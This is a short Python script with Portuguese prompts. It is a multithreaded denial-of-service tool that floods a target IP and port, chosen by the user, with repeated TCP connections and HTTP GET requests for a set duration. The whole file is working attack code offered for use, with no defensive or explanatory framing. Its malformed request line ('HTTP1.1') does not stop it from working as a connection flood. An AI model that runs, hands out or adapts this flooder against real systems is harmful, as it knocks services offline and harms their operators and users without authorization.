import socket
import threading
import time

def attack(ip, porta, num_requisicoes, tempo_final):
    requisicoes_enviadas = 0
    while time.time() < tempo_final and requisicoes_enviadas < num_requisicoes:
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.connect((ip, porta))
            s.send(b"GET / HTTP1.1\r\nHost: %b\r\n\r\n" % ip.encode())
            s.close()
            requisicoes_enviadas += 1
        except:
            pass

ip = input("Digite o IP do alvo: ")
porta = int(input("Digite a porta do alvo (ex: 80): "))
num_threads = int(input("Digite o numero de threads (ex: 100): "))
num_requisicoes = int(input("Quants requsições cada thread deve enviar? "))
duracao = int(input("Por quantos segundos o ataque deve durar? "))

tempo_final = time.time() + duracao

for i in range(num_threads):
    t = threading.Thread(target=attack, args=(ip, porta, num_requisicoes, tempo_final))
    t.start()



